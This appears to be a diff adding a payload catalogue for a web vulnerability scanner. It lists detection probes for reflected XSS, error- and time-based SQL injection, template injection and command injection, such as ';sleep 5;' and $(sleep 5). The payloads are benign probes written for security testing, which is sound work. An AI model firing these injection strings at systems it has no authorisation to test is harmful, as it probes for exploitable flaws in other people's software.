@@ -1,0 +1,171 @@
+# Suri web injection payload catalogue.
+# Code-managed; not intended for operator editing. Extend payloads here to add
+# new signatures without recompilation.
+#
+# Fields:
+#   id                  unique identifier
+#   payload             injection string; {canary} is replaced at probe time with
+#                       the scan canary token; {sleep} is replaced with SleepSecs
+#   category            xss | sqli | ssti | cmdi | redirect
+#   confirmation_method reflection | error | timing | expression-eval
+#   expected_signal     Go RE2 regex for content-based methods; empty for timing
+#   sleep_secs          sleep duration in seconds for timing payloads (default 5)
+
+# --- Reflected XSS ---
+
+[[payloads]]
+id = "xss-svg-canary"
+payload = "{canary}<svg onload=alert(1)>"
+category = "xss"
+confirmation_method = "reflection"
+expected_signal = ""
+
+[[payloads]]
+id = "xss-script-canary"
+payload = "{canary}<script>alert(1)</script>"
+category = "xss"
+confirmation_method = "reflection"
+expected_signal = ""
+
+[[payloads]]
+id = "xss-img-canary"
+payload = "{canary}<img src=x onerror=alert(1)>"
+category = "xss"
+confirmation_method = "reflection"
+expected_signal = ""
+
+# --- SQL injection: error-based ---
+
+[[payloads]]
+id = "sqli-error-single-quote"
+payload = "'"
+category = "sqli"
+confirmation_method = "error"
+expected_signal = "(?i)(you have an error in your sql syntax|warning: mysql_|syntax error at or near|unclosed quotation mark after the character string|quoted string not properly terminated|sqlite_error|sqlite3::|ora-[0-9]{4,5}|microsoft sql server|pg_query|pg_exec|\\[sqlite\\]|\\[mysql\\]|\\[pdo\\])"
+
+[[payloads]]
+id = "sqli-error-double-quote"
+payload = "\""
+category = "sqli"
+confirmation_method = "error"
+expected_signal = "(?i)(you have an error in your sql syntax|warning: mysql_|syntax error at or near|unclosed quotation mark after the character string|quoted string not properly terminated|sqlite_error|sqlite3::|ora-[0-9]{4,5}|microsoft sql server|pg_query|pg_exec|\\[sqlite\\]|\\[mysql\\]|\\[pdo\\])"
+
+[[payloads]]
+id = "sqli-error-or-true"
+payload = "1' OR '1'='1"
+category = "sqli"
+confirmation_method = "error"
+expected_signal = "(?i)(you have an error in your sql syntax|warning: mysql_|syntax error at or near|unclosed quotation mark after the character string|quoted string not properly terminated|sqlite_error|sqlite3::|ora-[0-9]{4,5}|microsoft sql server|pg_query|pg_exec|\\[sqlite\\]|\\[mysql\\]|\\[pdo\\])"
+
+# --- SQL injection: time-based ---
+
+[[payloads]]
+id = "sqli-sleep-mysql"
+payload = "' AND SLEEP({sleep})-- "
+category = "sqli"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "sqli-sleep-postgres"
+payload = "'; SELECT pg_sleep({sleep})-- "
+category = "sqli"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "sqli-sleep-mssql"
+payload = "'; WAITFOR DELAY '0:0:{sleep}'-- "
+category = "sqli"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "sqli-sleep-generic"
+payload = "1 AND SLEEP({sleep})"
+category = "sqli"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+# --- SSTI ---
+
+[[payloads]]
+id = "ssti-jinja2-twig"
+payload = "{canary}{{7*7}}"
+category = "ssti"
+confirmation_method = "expression-eval"
+expected_signal = "{canary}49"
+
+[[payloads]]
+id = "ssti-freemarker-velocity"
+payload = "{canary}${7*7}"
+category = "ssti"
+confirmation_method = "expression-eval"
+expected_signal = "{canary}49"
+
+[[payloads]]
+id = "ssti-erb"
+payload = "{canary}<%= 7*7 %>"
+category = "ssti"
+confirmation_method = "expression-eval"
+expected_signal = "{canary}49"
+
+[[payloads]]
+id = "ssti-thymeleaf"
+payload = "{canary}*{7*7}"
+category = "ssti"
+confirmation_method = "expression-eval"
+expected_signal = "{canary}49"
+
+[[payloads]]
+id = "ssti-mako-smarty"
+payload = "{canary}#{7*7}"
+category = "ssti"
+confirmation_method = "expression-eval"
+expected_signal = "{canary}49"
+
+# --- Command injection: timing only ---
+
+[[payloads]]
+id = "cmdi-sleep-semicolon"
+payload = ";sleep {sleep};"
+category = "cmdi"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "cmdi-sleep-pipe"
+payload = "|sleep {sleep}"
+category = "cmdi"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "cmdi-sleep-subshell"
+payload = "$(sleep {sleep})"
+category = "cmdi"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "cmdi-sleep-backtick"
+payload = "`sleep {sleep}`"
+category = "cmdi"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
+
+[[payloads]]
+id = "cmdi-sleep-ampersand"
+payload = "& ping -n {sleep} 127.0.0.1 &"
+category = "cmdi"
+confirmation_method = "timing"
+expected_signal = ""
+sleep_secs = 5
